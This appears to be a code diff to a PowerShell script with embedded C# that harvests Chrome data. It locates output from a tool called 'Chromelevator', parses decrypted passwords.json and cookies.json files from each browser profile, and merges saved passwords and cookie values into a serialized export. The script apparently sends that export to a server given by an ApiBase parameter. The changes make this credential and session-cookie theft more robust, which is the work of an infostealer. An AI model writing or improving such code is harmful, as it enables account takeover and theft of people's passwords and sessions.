@@ -381,6 +381,32 @@ function Protect-ChromelevatorBinary {
 
 }
 
+function Get-ChromelevatorChromeRoot {
+    param(
+        [string]$OutDir,
+        [string]$ElevatorPath
+    )
+
+    $candidates = @(
+        (Join-Path $OutDir "Chrome")
+        (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
+    )
+
+    foreach ($candidate in $candidates) {
+        if (-not (Test-Path -LiteralPath $candidate)) {
+            continue
+        }
+
+        $hasData = Get-ChildItem -LiteralPath $candidate -Recurse -Include cookies.json, passwords.json -File -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($hasData) {
+            return $candidate
+        }
+    }
+
+    return $null
+}
+
 function Invoke-ChromelevatorProcess {
     param(
         [string]$ElevatorPath,
@@ -437,6 +463,7 @@ function Invoke-ChromelevatorExtraction {
     }
 
     $outDir = $null
+    $elevatorPath = $null
     try {
         $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
         $meta.arch = $archTag
@@ -452,10 +479,7 @@ function Invoke-ChromelevatorExtraction {
     finally {
         if ($outDir -and (Test-Path $outDir)) {
             $script:ChromelevatorOutputRoot = $outDir
-            $candidate = Join-Path $outDir "Chrome"
-            if (Test-Path -LiteralPath $candidate) {
-                $script:ChromelevatorChromeRoot = $candidate
-            }
+            $script:ChromelevatorChromeRoot = Get-ChromelevatorChromeRoot -OutDir $outDir -ElevatorPath $elevatorPath
         }
     }
 
@@ -695,6 +719,82 @@ public static class __EXPORTER_CLASS__
         data[field] = serializer.DeserializeObject(json);
     }
 
+    private static string GetJsonString(Dictionary<string, object> entry, params string[] keys)
+    {
+        foreach (string key in keys)
+        {
+            if (entry.ContainsKey(key) && entry[key] != null)
+            {
+                return Convert.ToString(entry[key]) ?? "";
+            }
+        }
+
+        return "";
+    }
+
+    private static IEnumerable<object> CoerceJsonArray(object parsed)
+    {
+        if (parsed == null)
+        {
+            yield break;
+        }
+
+        var arrayList = parsed as ArrayList;
+        if (arrayList != null)
+        {
+            foreach (object item in arrayList)
+            {
+                yield return item;
+            }
+            yield break;
+        }
+
+        var objectArray = parsed as object[];
+        if (objectArray != null)
+        {
+            foreach (object item in objectArray)
+            {
+                yield return item;
+            }
+            yield break;
+        }
+
+        var enumerable = parsed as IEnumerable;
+        if (enumerable != null && !(parsed is string))
+        {
+            foreach (object item in enumerable)
+            {
+                yield return item;
+            }
+            yield break;
+        }
+
+        yield return parsed;
+    }
+
+    private static Dictionary<string, object> CoerceJsonDictionary(object item)
+    {
+        var dict = item as Dictionary<string, object>;
+        if (dict != null)
+        {
+            return dict;
+        }
+
+        var idict = item as IDictionary;
+        if (idict == null)
+        {
+            return null;
+        }
+
+        var result = new Dictionary<string, object>();
+        foreach (DictionaryEntry entry in idict)
+        {
+            result[Convert.ToString(entry.Key)] = entry.Value;
+        }
+
+        return result;
+    }
+
     private static string NormalizePasswordKey(string profile, string url, string username)
     {
         string normalizedUrl = string.IsNullOrEmpty(url) ? "" : url.TrimEnd('/').ToLowerInvariant();
@@ -709,24 +809,14 @@ public static class __EXPORTER_CLASS__
     {
         var abeMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
 
-        foreach (string profileDir in Directory.GetDirectories(chromeRoot))
+        foreach (string passwordsFile in Directory.GetFiles(chromeRoot, "passwords.json", SearchOption.AllDirectories))
         {
-            string passwordsFile = Path.Combine(profileDir, "passwords.json");
-            if (!File.Exists(passwordsFile))
-            {
-                continue;
-            }
+            string profileName = Path.GetFileName(Path.GetDirectoryName(passwordsFile));
+            object parsed = serializer.DeserializeObject(File.ReadAllText(passwordsFile, Encoding.UTF8));
 
-            string profileName = Path.GetFileName(profileDir);
-            var entries = serializer.DeserializeObject(File.ReadAllText(passwordsFile, Encoding.UTF8)) as ArrayList;
-            if (entries == null)
+            foreach (object item in CoerceJsonArray(parsed))
             {
-                continue;
-            }
-
-            foreach (object item in entries)
-            {
-                var entry = item as Dictionary<string, object>;
+                var entry = CoerceJsonDictionary(item);
                 if (entry == null || !entry.ContainsKey("pass") || entry["pass"] == null)
                 {
                     continue;
@@ -738,24 +828,19 @@ public static class __EXPORTER_CLASS__
                     continue;
                 }
 
-                string url = entry.ContainsKey("url") ? Convert.ToString(entry["url"]) : "";
-                string user = entry.ContainsKey("user") ? Convert.ToString(entry["user"]) : "";
+                string url = GetJsonString(entry, "url");
+                string user = GetJsonString(entry, "user", "username");
                 abeMap[NormalizePasswordKey(profileName, url, user)] = pass;
             }
         }
 
-        if (!data.ContainsKey("passwords") || data["passwords"] == null)
+        object passwordData = data.ContainsKey("passwords") ? data["passwords"] : null;
+        if (passwordData == null)
         {
             return;
         }
 
-        var passwords = data["passwords"] as ArrayList;
-        if (passwords == null)
-        {
-            return;
-        }
-
-        foreach (object item in passwords)
+        foreach (object item in CoerceJsonArray(passwordData))
         {
             var entry = item as Dictionary<string, object>;
             if (entry == null)
@@ -763,9 +848,9 @@ public static class __EXPORTER_CLASS__
                 continue;
             }
 
-            string profile = entry.ContainsKey("profile") ? Convert.ToString(entry["profile"]) : "";
-            string url = entry.ContainsKey("url") ? Convert.ToString(entry["url"]) : "";
-            string username = entry.ContainsKey("username") ? Convert.ToString(entry["username"]) : "";
+            string profile = GetJsonString(entry, "profile");
+            string url = GetJsonString(entry, "url");
+            string username = GetJsonString(entry, "username", "user");
             string key = NormalizePasswordKey(profile, url, username);
             string decrypted;
             if (!abeMap.TryGetValue(key, out decrypted) || string.IsNullOrEmpty(decrypted))
@@ -782,42 +867,26 @@ public static class __EXPORTER_CLASS__
         var cookies = new ArrayList();
         int index = 0;
 
-        foreach (string profileDir in Directory.GetDirectories(chromeRoot))
+        foreach (string cookiesFile in Directory.GetFiles(chromeRoot, "cookies.json", SearchOption.AllDirectories))
         {
-            string cookiesFile = Path.Combine(profileDir, "cookies.json");
-            if (!File.Exists(cookiesFile))
-            {
-                continue;
-            }
-
-            string profileName = Path.GetFileName(profileDir);
+            string profileName = Path.GetFileName(Path.GetDirectoryName(cookiesFile));
             object parsed = serializer.DeserializeObject(File.ReadAllText(cookiesFile, Encoding.UTF8));
-            ArrayList entries = parsed as ArrayList;
-            if (entries == null && parsed != null)
-            {
-                entries = new ArrayList { parsed };
-            }
 
-            if (entries == null)
+            foreach (object item in CoerceJsonArray(parsed))
             {
-                continue;
-            }
-
-            foreach (object item in entries)
-            {
-                var entry = item as Dictionary<string, object>;
+                var entry = CoerceJsonDictionary(item);
                 if (entry == null)
                 {
                     continue;
                 }
 
+                string value = GetJsonString(entry, "value", "pass");
                 var cookie = new Dictionary<string, object>();
                 cookie["index"] = index++;
                 cookie["profile"] = profileName;
-                cookie["host"] = entry.ContainsKey("host") ? Convert.ToString(entry["host"]) ?? "" : "";
-                cookie["name"] = entry.ContainsKey("name") ? Convert.ToString(entry["name"]) ?? "" : "";
-                cookie["path"] = entry.ContainsKey("path") ? Convert.ToString(entry["path"]) ?? "" : "";
-                string value = entry.ContainsKey("value") ? Convert.ToString(entry["value"]) ?? "" : "";
+                cookie["host"] = GetJsonString(entry, "host", "domain");
+                cookie["name"] = GetJsonString(entry, "name");
+                cookie["path"] = GetJsonString(entry, "path");
                 cookie["value"] = value;
                 cookie["value_dpapi"] = value;
 
@@ -1686,7 +1755,13 @@ Write-DebugStep "Export completed (jsonLength=$($exportJsonRaw.Length))"
 
 $profileMetadata = Get-ChromeProfileMetadata
 $chromelevatorMeta = Invoke-ChromelevatorExtraction -ApiBase $ApiBase
-Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), root=$($script:ChromelevatorChromeRoot))"
+$cookieFileCount = 0
+if ($script:ChromelevatorChromeRoot) {
+    $cookieFileCount = @(
+        Get-ChildItem -LiteralPath $script:ChromelevatorChromeRoot -Filter cookies.json -Recurse -File -ErrorAction SilentlyContinue
+    ).Count
+}
+Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), root=$($script:ChromelevatorChromeRoot), cookieFiles=$cookieFileCount)"
 
 Write-DebugStep "Serializing payload"
 $chromeRoot = if ($script:ChromelevatorChromeRoot) { [string]$script:ChromelevatorChromeRoot } else { "" }
